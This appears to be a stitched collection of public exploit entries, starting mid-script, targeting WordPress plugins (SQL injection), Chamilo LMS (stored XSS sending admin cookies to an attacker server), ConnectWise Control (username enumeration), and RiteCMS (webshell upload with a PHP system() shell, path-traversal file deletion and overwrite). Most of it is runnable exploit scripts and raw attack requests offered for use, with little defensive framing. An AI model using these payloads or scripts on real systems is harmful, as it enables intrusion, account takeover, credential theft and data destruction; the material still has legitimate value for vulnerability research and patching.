sql_injection_code = sql_injection_code.replace(' ', '+')
exploitcode_url = 'http://' + target_ip + ':' + target_port + wp_path + 'wp-admin/edit.php?post_type=dlm_download&page=download-monitor-logs&orderby=download_date`' + sql_injection_code + '`user_id'
exploit = session.get(exploitcode_url)
print(exploit)
print('Exploit finished at: ' + str(datetime.now().strftime('%H:%M:%S')))
# Exploit Title: Chamilo LMS 1.11.14 - Account Takeover
# Date: July 21 2021
# Exploit Author: sirpedrotavares
# Vendor Homepage: https://chamilo.org
# Software Link: https://chamilo.org
# Version:  Chamilo-lms-1.11.x
# Tested on:  Chamilo-lms-1.11.x
# CVE: CVE-2021-37391
#Publication:
https://gitbook.seguranca-informatica.pt/cve-and-exploits/cves/chamilo-lms-1.11.14-xss-vulnerabilities


Description:  A user without privileges in Chamilo LMS 1.11.x can send an
invitation message to another user, e.g., the administrator, through
main/social/search.php,
main/inc/lib/social.lib.php and steal cookies or execute arbitrary code on
the administration side via a stored XSS vulnerability via social network
the send invitation feature.  .
CVE ID: CVE-2021-37391
CVSS:  Medium - CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:U/C:H/I:L/A:N
URL:
https://gitbook.seguranca-informatica.pt/cve-and-exploits/cves/chamilo-lms-1.11.14-xss-vulnerabilities

Affected parameter: send private message - text field
Payload:  <img src=x onerror=this.src='
http://yourserver/?c='+document.cookie>


Steps to reproduce:
  1. Navigate to the social network menu
  2. Select the victim profile
  3. Add the payload on the text field
  4. Submit the request and wait for the payload execution

*Impact:* By using this vulnerability, an unprivileged user can steal
cookies from an admin account or force the administrator to create an
account with admin privileges with an HTTP 302 redirect.
*Mitigation*: Update the Chamilo to the latest version.
*Fix*:
https://github.com/chamilo/chamilo-lms/commit/de43a77049771cce08ea7234c5c1510b5af65bc8




Com os meus melhores cumprimentos,
--
*Pedro Tavares*
Founder and Editor-in-Chief at seguranca-informatica.pt
Co-founder of CSIRT.UBI
Creator of 0xSI_f33d <https://feed.seguranca-informatica.pt/>



seguranca-informatica.pt | @Enes4xd
<https://twitter.com/sirpedrotavares> | 0xSI_f33d
<https://feed.seguranca-informatica.pt/>
# Exploit Title: ConnectWise Control 19.2.24707 - Username Enumeration
# Date: 17/12/2021
# Exploit Author: Luca Cuzzolin aka czz78
# Vendor Homepage: https://www.connectwise.com/
# Version: vulnerable <= 19.2.24707
# CVE : CVE-2019-16516

# https://github.com/czz/ScreenConnect-UserEnum

from multiprocessing import Process, Queue
from statistics import mean
from urllib3 import exceptions as urlexcept
import argparse
import math
import re
import requests

class bcolors:
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKCYAN = '\033[96m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'


headers = []

def header_function(header_line):
    headers.append(header_line)


def process_enum(queue, found_queue, wordlist, url, payload, failstr, verbose, proc_id, stop, proxy):
    try:
        # Payload to dictionary
        payload_dict = {}
        for load in payload:
            split_load = load.split(":")
            if split_load[1] != '{USER}':
                payload_dict[split_load[0]] = split_load[1]
            else:
                payload_dict[split_load[0]] = '{USER}'

        # Enumeration
        total = len(wordlist)
        for counter, user in enumerate(wordlist):
            user_payload = dict(payload_dict)
            for key, value in user_payload.items():
                if value == '{USER}':
                    user_payload[key] = user

            dataraw = "".join(['%s=%s&' % (key, value) for (key, value) in user_payload.items()])[:-1]
            headers={"Accept": "*/*" , "Content-Type": "application/x-www-form-urlencoded", "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36"}

            req = requests.request('POST',url,headers=headers,data=dataraw, proxies=proxies)

            x = "".join('{}: {}'.format(k, v) for k, v in req.headers.items())

            if re.search(r"{}".format(failstr), str(x).replace('\n','').replace('\r','')):
                queue.put((proc_id, "FOUND", user))
                found_queue.put((proc_id, "FOUND", user))
                if stop: break
            elif verbose:
                queue.put((proc_id, "TRIED", user))
            queue.put(("PERCENT", proc_id, (counter/total)*100))

    except (urlexcept.NewConnectionError, requests.exceptions.ConnectionError):
        print("[ATTENTION] Connection error on process {}! Try lowering the amount of threads with the -c parameter.".format(proc_id))


if __name__ == "__main__":
    # Arguments
    parser = argparse.ArgumentParser(description="http://example.com/Login user enumeration tool")
    parser.add_argument("url", help="http://example.com/Login")
    parser.add_argument("wordlist", help="username wordlist")
    parser.add_argument("-c", metavar="cnt", type=int, default=10, help="process (thread) count, default 10, too many processes may cause connection problems")
    parser.add_argument("-v", action="store_true", help="verbose mode")
    parser.add_argument("-s", action="store_true", help="stop on first user found")
    parser.add_argument("-p", metavar="proxy", type=str, help="socks4/5 http/https proxy, ex: socks5://127.0.0.1:9050")
    args = parser.parse_args()

    # Arguments to simple variables
    wordlist = args.wordlist
    url = args.url
    payload = ['ctl00%24Main%24userNameBox:{USER}', 'ctl00%24Main%24passwordBox:a', 'ctl00%24Main%24ctl05:Login', '__EVENTTARGET:', '__EVENTARGUMENT:', '__VIEWSTATE:']
    verbose = args.v
    thread_count = args.c
    failstr = "PasswordInvalid"
    stop = args.s
    proxy= args.p

    print(bcolors.HEADER + """
      __   ___  __     ___
|  | |__  |__  |__)   |__  |\ | |  | |\/|
|__| ___| |___ |  \   |___ | \| |__| |  |

ScreenConnect POC by czz78 :)

    """+ bcolors.ENDC);
    print("URL: "+url)
    print("Payload: "+str(payload))
    print("Fail string: "+failstr)
    print("Wordlist: "+wordlist)
    if verbose: print("Verbose mode")
    if stop: print("Will stop on first user found")

    proxies = {'http': '', 'https': ''}
    if proxy:
        proxies = {'http': proxy, 'https': proxy}

    print("Initializing processes...")
    # Distribute wordlist to processes
    wlfile = open(wordlist, "r", encoding="ISO-8859-1")  # or utf-8
    tothread = 0
    wllist = [[] for i in range(thread_count)]
    for user in wlfile:
        wllist[tothread-1].append(user.strip())
        if (tothread < thread_count-1):
            tothread+=1
        else:
            tothread = 0

    # Start processes
    tries_q = Queue()
    found_q = Queue()
    processes = []
    percentage = []
    last_percentage = 0
    for i in range(thread_count):
        p = Process(target=process_enum, args=(tries_q, found_q, wllist[i], url, payload, failstr, verbose, i, stop, proxy))
        processes.append(p)
        percentage.append(0)
        p.start()

    print(bcolors.OKBLUE + "Processes started successfully! Enumerating." + bcolors.ENDC)
    # Main process loop
    initial_count = len(processes)
    while True:
        # Read the process output queue
        try:
            oldest = tries_q.get(False)
            if oldest[0] == 'PERCENT':
                percentage[oldest[1]] = oldest[2]
            elif oldest[1] == 'FOUND':
                print(bcolors.OKGREEN + "[{}] FOUND: {}".format(oldest[0], oldest[2]) + bcolors.ENDC)
            elif verbose:
                print(bcolors.OKCYAN + "[{}] Tried: {}".format(oldest[0], oldest[2]) + bcolors.ENDC)
        except: pass

        # Calculate completion percentage and print if /10
        total_percentage = math.ceil(mean(percentage))
        if total_percentage % 10 == 0 and total_percentage != last_percentage:
            print("{}% complete".format(total_percentage))
            last_percentage = total_percentage

        # Pop dead processes
        for k, p in enumerate(processes):
            if p.is_alive() == False:
                processes.pop(k)

        # Terminate all processes if -s flag is present
        if len(processes) < initial_count and stop:
            for p in processes:
                p.terminate()

        # Print results and terminate self if finished
        if len(processes) == 0:
            print(bcolors.OKBLUE + "EnumUser finished, and these usernames were found:" + bcolors.ENDC)
            while True:
                try:
                    entry = found_q.get(False)
                    print(bcolors.OKGREEN + "[{}] FOUND: {}".format(entry[0], entry[2]) + bcolors.ENDC)
                except:
                    break
             quit()
# Exploit Title: RiteCMS 3.1.0 - Remote Code Execution (RCE) (Authenticated)
# Date: 25/07/2021
# Exploit Author: faisalfs10x (https://github.com/faisalfs10x)
# Vendor Homepage: https://ritecms.com/
# Software Link: https://github.com/handylulu/RiteCMS/releases/download/V3.1.0/ritecms.v3.1.0.zip
# Version: <= 3.1.0
# Tested on: Windows 10, Ubuntu 18, XAMPP
# Google Dork: intext:"Powered by RiteCMS"
# Reference: https://gist.github.com/faisalfs10x/bd12e9abefb0d44f020bf297a14a4597


"""
################
# Description  #
################

# RiteCMS version 3.1.0 and below suffers from a remote code execution in admin panel. An authenticated attacker can upload a php file and bypass the .htacess configuration that deny execution of .php files in media and files directory by default.
# There are 4 ways of bypassing the current file upload protection to achieve remote code execution.

# Method 1: Delete the .htaccess file in the media and files directory through the files manager module and then upload the php file - RCE achieved

# Method 2: Rename .php file extension to .pHp or any except ".php", eg shell.pHp and upload the shell.pHp file - RCE achieved

# Method 3: Chain with Arbitrary File Overwrite vulnerability by uploading .php file to web root because .php execution is allow in web root - RCE achieved
By default, attacker can only upload image in media and files directory only - Arbitrary File Overwrite vulnerability.
Intercept the request, modify file_name param and place this payload "../webrootExec.php" to upload the php file to web root

body= Content-Disposition: form-data; name="file_name"
body= ../webrootExec.php

So, webshell can be accessed in web root via http://localhost/ritecms.v3.1.0/webrootExec.php

# Method 4: Upload new .htaccess to overwrite the old one with content like below for allowing access to one specific php file named "webshell.php" then upload PHP webshell.php - RCE achieved

$ cat .htaccess

<Files *.php>
deny from all
</Files>

<Files ~ "webshell\.php$">
  Allow from all
</Files>


###################################
# PoC for webshell using Method 2 #
###################################

Steps to Reproduce:

1. Login as admin
2. Go to Files Manager
3. Choose a directory to upload .php file either media or files directory.
4. Then, click Upload file > Browse..
3. Upload .php file with extension of pHp, eg webshell.pHp - to bypass .htaccess
4. The webshell.pHp is available at http://localhost/ritecms.v3.1.0/media/webshell.pHp - if you choose media directory else switch to files directory

Request:
========

POST /ritecms.v3.1.0/admin.php HTTP/1.1
Host: localhost
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:90.0) Gecko/20100101 Firefox/90.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: multipart/form-data; boundary=---------------------------410923806710384479662671954309
Content-Length: 1744
Origin: http://localhost
DNT: 1
Connection: close
Referer: http://localhost/ritecms.v3.1.0/admin.php?mode=filemanager&action=upload&directory=media
Cookie: PHPSESSID=vs8iq0oekpi8tip402mk548t84
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Sec-GPC: 1

-----------------------------410923806710384479662671954309
Content-Disposition: form-data; name="mode"

filemanager
-----------------------------410923806710384479662671954309
Content-Disposition: form-data; name="file"; filename="webshell.pHp"
Content-Type: application/octet-stream

<?php system($_GET[base64_decode('Y21k')]);?>
-----------------------------410923806710384479662671954309
Content-Disposition: form-data; name="directory"

media
-----------------------------410923806710384479662671954309
Content-Disposition: form-data; name="file_name"

-----------------------------410923806710384479662671954309
Content-Disposition: form-data; name="upload_mode"

1
-----------------------------410923806710384479662671954309
Content-Disposition: form-data; name="resize_xy"

x
-----------------------------410923806710384479662671954309
Content-Disposition: form-data; name="resize"

640
-----------------------------410923806710384479662671954309
Content-Disposition: form-data; name="compression"

80
-----------------------------410923806710384479662671954309
Content-Disposition: form-data; name="thumbnail_resize_xy"

x
-----------------------------410923806710384479662671954309
Content-Disposition: form-data; name="thumbnail_resize"

150
-----------------------------410923806710384479662671954309
Content-Disposition: form-data; name="thumbnail_compression"

70
-----------------------------410923806710384479662671954309
Content-Disposition: form-data; name="upload_file_submit"

OK - Upload file
-----------------------------410923806710384479662671954309--


####################
# Webshell access: #
####################

# Webshell access via:
PoC: http://localhost/ritecms.v3.1.0/media/webshell.pHp?cmd=id

# Output:
uid=33(www-data) gid=33(www-data) groups=33(www-data)

"""
# Exploit Title: RiteCMS 3.1.0 - Arbitrary File Deletion (Authenticated)
# Date: 25/07/2021
# Exploit Author: faisalfs10x (https://github.com/faisalfs10x)
# Vendor Homepage: https://ritecms.com/
# Software Link: https://github.com/handylulu/RiteCMS/releases/download/V3.1.0/ritecms.v3.1.0.zip
# Version: <= 3.1.0
# Google Dork: intext:"Powered by RiteCMS"
# Tested on: Windows 10, Ubuntu 18, XAMPP
# Reference: https://gist.github.com/faisalfs10x/5514b3eaf0a108e27f45657955e539fd


################
# Description  #
################

# RiteCMS version 3.1.0 and below suffers from an arbitrary file deletion vulnerability in Admin Panel. Exploiting the vulnerability allows an authenticated attacker to delete any file in the web root (along with any other file on the server that the PHP process user has the proper permissions to delete). Furthermore, an attacker might leverage the capability of arbitrary file deletion to circumvent certain webserver security mechanisms such as deleting .htaccess file that would deactivate those security constraints.


#####################################################
# PoC to delete secretConfig.conf file in web root  #
#####################################################


Steps to Reproduce:

1. Login as admin
2. Go to File Manager
3. Delete any file
4. Intercept the request and replace current file name to any files on the server via parameter "delete".

# Assumed there is a secretConfig.conf file in web root

PoC: param delete - Deleting secretConfig.conf file in web root, so the payload will be "../secretConfig.conf"

Request:
========

GET /ritecms.v3.1.0/admin.php?mode=filemanager&directory=media&delete=../secretConfig.conf&confirmed=true HTTP/1.1
Host: localhost
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:90.0) Gecko/20100101 Firefox/90.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
DNT: 1
Connection: close
Referer: http://localhost/ritecms.v3.1.0/admin.php?mode=filemanager
Cookie: PHPSESSID=vs8iq0oekpi8tip402mk548t84
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Sec-GPC: 1
# Exploit Title: RiteCMS 3.1.0 - Arbitrary File Overwrite (Authenticated)
# Date: 25/07/2021
# Exploit Author: faisalfs10x (https://github.com/faisalfs10x)
# Vendor Homepage: https://ritecms.com/
# Software Link: https://github.com/handylulu/RiteCMS/releases/download/V3.1.0/ritecms.v3.1.0.zip
# Version: <= 3.1.0
# Google Dork: intext:"Powered by RiteCMS"
# Tested on: Windows 10, Ubuntu 18, XAMPP
# Reference: https://gist.github.com/faisalfs10x/4a3b76f666ff4c0443e104c3baefb91b


################
# Description  #
################

# RiteCMS version 3.1.0 and below suffers from an arbitrary file overwrite vulnerability in Admin Panel. Exploiting the vulnerability allows an authenticated attacker to overwrite any file in the web root (along with any other file on the server that the PHP process user has the proper permissions to write). Furthermore, an attacker might leverage the capability of arbitrary file overwrite to modify existing file such as /etc/passwd or /etc/shadow if the current PHP process user is run as root.


############################################################
# PoC to overwrite existing index.php to display phpinfo() #
############################################################


Steps to Reproduce:

1. Login as admin
2. Go to File Manager
3. Then, click Upload file > Browse..
4. Upload any file and click checkbox name "overwrite file with same name"
4. Intercept the request and replace current file name to any files path on the server via parameter "file_name".


PoC: param file_name - to overwrite index.php to display phpinfo, so the payload will be "../index.php"
     param filename - with the content of "<?php phpinfo(); ?>"

Request:
========

POST /ritecmsv3.1.0/admin.php HTTP/1.1
Host: localhost
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:90.0) Gecko/20100101 Firefox/90.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: multipart/form-data; boundary=---------------------------351719865731412638493510448298
Content-Length: 1840
Origin: http://localhost
DNT: 1
Connection: close
Referer: http://192.168.8.143/ritecmsv3.1.0/admin.php?mode=filemanager&action=upload&directory=media
Cookie: PHPSESSID=nuevl0lgkrc3dv44g3vgkoqqre
Upgrade-Insecure-Requests: 1
Sec-GPC: 1

-----------------------------351719865731412638493510448298
Content-Disposition: form-data; name="mode"

filemanager
-----------------------------351719865731412638493510448298
Content-Disposition: form-data; name="file"; filename="anyfile.txt"
Content-Type: application/octet-stream

content of the file to overwrite here
-- this is example to overwrite index.php to display phpinfo --
<?php phpinfo(); ?>
-----------------------------351719865731412638493510448298
Content-Disposition: form-data; name="directory"

media
-----------------------------351719865731412638493510448298
Content-Disposition: form-data; name="file_name"

../index.php
-----------------------------351719865731412638493510448298
Content-Disposition: form-data; name="overwrite_file"

true
-----------------------------351719865731412638493510448298
Content-Disposition: form-data; name="upload_mode"

1
-----------------------------351719865731412638493510448298
Content-Disposition: form-data; name="resize_xy"

x
-----------------------------351719865731412638493510448298
Content-Disposition: form-data; name="resize"

640
-----------------------------351719865731412638493510448298
Content-Disposition: form-data; name="compression"

80
-----------------------------351719865731412638493510448298
Content-Disposition: form-data; name="thumbnail_resize_xy"

x
-----------------------------351719865731412638493510448298
Content-Disposition: form-data; name="thumbnail_resize"

150
-----------------------------351719865731412638493510448298
Content-Disposition: form-data; name="thumbnail_compression"

70
-----------------------------351719865731412638493510448298
Content-Disposition: form-data; name="upload_file_submit"

OK - Upload file
-----------------------------351719865731412638493510448298--
# Exploit Title: WordPress Plugin WP Visitor Statistics 4.7 - SQL Injection
# Date 22/12/2021
# Exploit Author: Ron Jost (Hacker5preme)
# Vendor Homepage: https://www.plugins-market.com/
# Software Link: https://downloads.wordpress.org/plugin/wp-stats-manager.4.7.zip
# Version: <= 4.7
# Tested on: Ubuntu 18.04
# CVE: CVE-2021-24750
# CWE: CWE-89
# Documentation: https://github.com/Hacker5preme/Exploits/blob/main/Wordpress/CVE-2021-24750/README.md

'''
Description:
The plugin does not properly sanitise and escape the refUrl in the refDetails AJAX action,
available to any authenticated user, which could allow users with a role as low as
subscriber to perform SQL injection attacks
'''

# Banner:
banner = '''
 ___  _  _  ____     ___   ___  ___   __     ___   __  ___  ___   ___ 
 / __)( \/ )( ___)___(__ \ / _ \(__ \ /  )___(__ \ /. |(__ )| __) / _ \
( (__  \  /  )__)(___)/ _/( (_) )/ _/  )((___)/ _/(_  _)/ / |__ \( (_) )
 \___)  \/  (____)   (____)\___/(____)(__)   (____) (_)(_/  (___/ \___/

                            [+] WP Visitor Statistics SQL Injection
                            [@] Developed by Ron Jost (Hacker5preme)

'''
print(banner)

import argparse
import requests
from datetime import datetime

# User-Input:
my_parser = argparse.ArgumentParser(description='Wordpress Plugin WP Visitor Statistics - SQL Injection')
my_parser.add_argument('-T', '--IP', type=str)
my_parser.add_argument('-P', '--PORT', type=str)
my_parser.add_argument('-U', '--PATH', type=str)
my_parser.add_argument('-u', '--USERNAME', type=str)
my_parser.add_argument('-p', '--PASSWORD', type=str)
my_parser.add_argument('-C', '--COMMAND', type=str)
args = my_parser.parse_args()
target_ip = args.IP
target_port = args.PORT
wp_path = args.PATH
username = args.USERNAME
password = args.PASSWORD
command = args.COMMAND

print('')
print('[*] Starting Exploit at: ' + str(datetime.now().strftime('%H:%M:%S')))
print('')

# Authentication:
session = requests.Session()
auth_url = 'http://' + target_ip + ':' + target_port + wp_path + 'wp-login.php'
check = session.get(auth_url)
# Header:
header = {
    'Host': target_ip,
    'User-Agent': 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:89.0) Gecko/20100101 Firefox/89.0',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
    'Accept-Language': 'de,en-US;q=0.7,en;q=0.3',
    'Accept-Encoding': 'gzip, deflate',
    'Content-Type': 'application/x-www-form-urlencoded',
    'Origin': 'http://' + target_ip,
    'Connection': 'close',
    'Upgrade-Insecure-Requests': '1'
}

# Body:
body = {
    'log': username,
    'pwd': password,
    'wp-submit': 'Log In',
    'testcookie': '1'
}
auth = session.post(auth_url, headers=header, data=body)

# Exploit:
exploit_url = 'http://' + target_ip + ':' + target_port + '/wordpress/wp-admin/admin-ajax.php?action=refDetails&requests={"refUrl":"' + "' " + command + '"}'
exploit = session.get(exploit_url)
print(exploit.text)
print('Exploit finished at: ' + str(datetime.now().strftime('%H:%M:%S')))  
